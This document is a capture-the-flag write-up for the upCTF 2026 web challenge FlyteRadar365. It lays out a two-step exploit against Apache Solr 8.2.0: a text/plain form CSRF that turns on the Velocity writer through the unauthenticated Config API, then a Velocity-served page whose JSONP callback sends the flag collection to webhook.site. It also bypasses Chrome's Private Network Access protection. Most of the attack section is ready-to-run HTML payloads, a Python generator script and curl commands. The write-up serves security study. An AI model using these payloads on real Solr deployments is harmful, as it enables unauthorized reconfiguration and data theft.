# FlyteRadar365 — upCTF 2026 (Web)

## Flag
`upCTF{__t074l_3cl1ps3_0f_th3_0r1g1n__flag_fixed}`

## TL;DR
Two-step exploit: (1) HTML form POST enables Solr Velocity Response Writer via Config API, (2) redirect to Velocity URL serves attacker HTML from Solr origin, enabling same-origin JSONP to exfiltrate the flag from a separate collection. Both steps bypass Chrome Private Network Access via top-level navigations.

## Description
> The sky is going dark, and FlyteRadar365 is the only way to track the eclipse-chasing fleet. Can you shed some light on it?

## Architecture
```
                    ┌─────────────────────────────────────┐
                    │         Docker internal network      │
  Internet          │                                      │
  ─────────►  :5003 │  Express.js (web)                    │
  /api/report ───►  │    :5003 public  ──► Solr queries    │
                    │    :8080 admin   ──► admin.html       │
                    │                      (has API token)  │
                    │  Solr 8.2.0                           │
                    │    :8983 ──► flights collection       │
                    │           ──► flag collection (FLAG)  │
                    │  Bot (Puppeteer/Chromium ~110)        │
                    │    visits user-submitted URLs         │
                    └─────────────────────────────────────┘
```

- **Express.js** serves on port 5003 (public) and 8080 (internal/admin)
- **Solr 8.2.0** has two collections: `flights` (flight data) and `flag` (contains the flag)
- **Puppeteer bot** (Chromium ~110, `--no-sandbox`) visits any URL starting with `http`, waits 5s nav + 5s idle
- **admin.html** on :8080 has a random 64-char hex API token, uses postMessage to receive queries

## Source Code Analysis

### Parameter Injection (server.js:95)
```js
const queryUrl = `${BASE_SOLR_URL}/flights/select?q=${query}&df=destination&rows=10`
```
The `query` is embedded raw into the Solr URL — full parameter injection. There's a filter:
```js
if (/[\?&]collection/i.test(query)) return res.status(403)...
```
Bypassed by `flagdata.collection` (no `?` or `&` prefix). But this path wasn't needed for the final exploit.

### postMessage Origin Check (admin.html)
```js
if (event.origin !== window.origin) return;
```
Bypassable via `sandbox="allow-scripts"` iframe (both origins become `null`). Works locally but PNA blocks loading admin.html from a public page.

### Solr 8.2.0 — Velocity Writer + Config API
- Velocity Response Writer ships with Solr 8.2.0 but `params.resource.loader.enabled` is `false` by default
- Config API at `/solr/flights/config` accepts POST with `text/plain` Content-Type
- Solr tolerates trailing `=` after valid JSON body (critical for HTML form submission)

### Solr JSONP
- `json.wrf` parameter wraps JSON response in a callback function
- Works on ANY collection including `flag`
- No authentication required on Solr directly

## Vulnerabilities Summary

| # | Vulnerability | CWE | Impact |
|---|--------------|-----|--------|
| 1 | Solr Config API accessible without auth | CWE-306 | Enable arbitrary response writers |
| 2 | Velocity custom templates (CVE-2019-17558) | CWE-94 | Serve arbitrary HTML from Solr origin |
| 3 | Solr JSONP (`json.wrf`) | CWE-200 | Cross-collection data exfiltration |
| 4 | PNA bypass via top-level navigation | CWE-346 | Public→private network access |
| 5 | `text/plain` form POST = valid Solr JSON | CWE-20 | CSRF on Solr Config API |

## Approaches Tried & Failed

### Approach 1: postMessage + Sandbox Origin Bypass + Solr Subquery
**Idea**: Sandbox iframe (origin `null`) embeds `admin.html` (also `null` due to sandbox), sends postMessage with Solr subquery injection (`fl=id,flagdata:[subquery]&flagdata.collection=flag`) to read flag collection via admin's API token.

**Result**: Works perfectly locally. Fails remotely because Chrome PNA blocks the sandboxed iframe from loading `http://ctf-web:8080/admin.html` (subresource load from public→private).

**Debug evidence**: Webhook received `s=loaded` (page loaded) but `s=jsonp_ERR` (JSONP failed = PNA blocked).

### Approach 2: Direct JSONP to Solr
**Idea**: `<script src="http://solr:8983/solr/flag/select?q=*:*&wt=json&json.wrf=steal">` from our page.

**Result**: Same PNA issue — `<script>` tag is a subresource load, blocked from public→private.

### Approach 3: Single-page Velocity (form POST in iframe + redirect)
**Idea**: Form POST to Solr config via `target="iframe"`, wait 2s, `location.href` to velocity URL.

**Result**: Form submission targeting an iframe is treated as subresource navigation by PNA → blocked. Also tried with `"x":"` trick to handle the `=` from form encoding (unnecessary — Solr accepts trailing `=`).

### Approach 4 (FINAL): Two-page Velocity + JSONP ✓
**Idea**: Split into two separate bot visits with top-level navigations only.

**Result**: Works! Both form submit (no target) and `location.href` are top-level navigations → PNA allows them.

## Final Attack Chain

### Prerequisites
- External HTTP server accessible from bot (we used `137.74.40.219:8888`)
- webhook.site for data exfiltration
- Two `/api/report` submissions (one per step)

### Step 1: Enable Velocity (`x.html`)
Bot visits `http://ATTACKER:8888/x.html`. The page auto-submits a form POST to Solr Config API:

```html
<!DOCTYPE html><html><body>
<form id="f" method="POST"
  action="http://solr:8983/solr/flights/config"
  enctype="text/plain">
<input type="hidden"
  name='{"update-queryresponsewriter":{
    "startup":"lazy",
    "name":"velocity",
    "class":"solr.VelocityResponseWriter",
    "template.base.dir":"",
    "solr.resource.loader.enabled":"true",
    "params.resource.loader.enabled":"true"}}'
  value="">
</form>
<script>document.getElementById("f").submit();</script>
</body></html>
```

**Why this works**:
- `enctype="text/plain"` → browser sends `name=value` as body → `{json}=`
- Solr JSON parser accepts trailing `=` after valid JSON ✓
- No `target` attribute → **top-level navigation** → bypasses PNA ✓
- `text/plain` is a "simple" Content-Type → no CORS preflight ✓
- This enables `params.resource.loader` in Solr's velocity writer

### Step 2: Read Flag via Velocity + JSONP (`y.html`)
After ~15s (enough for step 1 to complete), bot visits `http://ATTACKER:8888/y.html`:

```html
<!DOCTYPE html><html><body>
<script>
location.href = "http://solr:8983/solr/flights/select?q=*:*"
  + "&wt=velocity&v.template=custom&v.template.custom="
  + encodeURIComponent(VELOCITY_TEMPLATE);
</script>
</body></html>
```

The `VELOCITY_TEMPLATE` is URL-encoded HTML that Solr serves as the response:

```html
<html><body><script>
// JSONP callback — receives flag data
window.steal = function(d) {
  new Image().src = "https://webhook.site/UUID?flag="
    + encodeURIComponent(JSON.stringify(d).substring(0, 500));
};
// Same-origin JSONP request to flag collection
var s = document.createElement("script");
s.src = "/solr/flag/select?q=*:*"
  + String.fromCharCode(38) + "wt=json"
  + String.fromCharCode(38) + "json.wrf=steal";
document.body.appendChild(s);
</script></body></html>
```

**Why this works**:
- `location.href` → **top-level navigation** → bypasses PNA ✓
- Solr velocity serves our HTML → browser is now on `solr:8983` origin
- JSONP `<script>` to `/solr/flag/select` is **same-origin** → no PNA, no CORS ✓
- `json.wrf=steal` wraps response as `steal({...})` → calls our callback
- Flag exfiltrated to webhook.site via `new Image().src`

### Deployment Script (for remote server)
```python
python3 -c "
import urllib.parse
# x.html — form POST to enable velocity
Q=chr(39)
x='<!DOCTYPE html><html><body>\n'
x+='<form id=\"f\" method=\"POST\" '
x+='action=\"http://solr:8983/solr/flights/config\" '
x+='enctype=\"text/plain\">\n'
x+='<input type=\"hidden\" name='+Q
x+='{\"update-queryresponsewriter\":{\"startup\":\"lazy\",'
x+='\"name\":\"velocity\",\"class\":\"solr.VelocityResponseWriter\",'
x+='\"template.base.dir\":\"\",\"solr.resource.loader.enabled\":\"true\",'
x+='\"params.resource.loader.enabled\":\"true\"}}'+Q+' value=\"\">\n'
x+='</form>\n<script>document.getElementById(\"f\").submit();</script>\n'
x+='</body></html>'
open('/tmp/x.html','w').write(x)

# y.html — velocity redirect + JSONP exfil
WH='WEBHOOK_UUID_HERE'
t='<html><body><script>'
t+='window.steal=function(d){new Image().src=\"https://webhook.site/'
t+=WH+'?flag=\"+encodeURIComponent(JSON.stringify(d).substring(0,500))};'
t+='var s=document.createElement(\"script\");'
t+='s.src=\"/solr/flag/select?q=*:*\"+String.fromCharCode(38)'
t+='+\"wt=json\"+String.fromCharCode(38)+\"json.wrf=steal\";'
t+='document.body.appendChild(s);</script></body></html>'
e=urllib.parse.quote(t,safe='')
u='http://solr:8983/solr/flights/select?q=*:*'
u+='&wt=velocity&v.template=custom&v.template.custom='+e
y='<!DOCTYPE html><html><body><script>location.href=\"'+u+'\";</script></body></html>'
open('/tmp/y.html','w').write(y)
print('OK')
"
cd /tmp && python3 -m http.server 8888
```

Then:
```bash
# Step 1: Enable velocity
curl -X POST http://CHALLENGE/api/report -H 'Content-Type: application/json' \
  -d '{"url":"http://ATTACKER:8888/x.html"}'

sleep 15

# Step 2: Exfiltrate flag
curl -X POST http://CHALLENGE/api/report -H 'Content-Type: application/json' \
  -d '{"url":"http://ATTACKER:8888/y.html"}'
```

## Key Takeaways

1. **Chrome PNA is NOT absolute**: top-level navigations (form submits, location.href) bypass it entirely. Only subresource loads (fetch, script, iframe, img) are blocked.

2. **Solr Config API has no auth**: any request (even `text/plain` from an HTML form) can reconfigure response writers, enabling velocity templates.

3. **Solr JSON parser is lenient**: accepts trailing `=` after valid JSON, making HTML form CSRF trivial.

4. **Two visits > one visit**: splitting the exploit into config-change + exploit-it avoids complex single-page timing issues.

5. **`String.fromCharCode(38)` for `&`**: when embedding URLs inside JavaScript inside URL-encoded velocity templates, `&` gets double-encoded. Using `String.fromCharCode(38)` avoids this.

6. **Local ≠ Remote**: the sandboxed iframe + postMessage approach works perfectly locally (same Docker network = no PNA) but fails remotely. Always test against the actual remote setup.

## References
- [CVE-2019-17558 — Apache Solr Velocity RCE](https://nvd.nist.gov/vuln/detail/CVE-2019-17558)
- [Chrome Private Network Access](https://developer.chrome.com/blog/private-network-access-update/)
- [Solr Response Writers — json.wrf](https://solr.apache.org/guide/response-writers.html)
- [HTML Form enctype text/plain CSRF](https://portswigger.net/web-security/csrf)
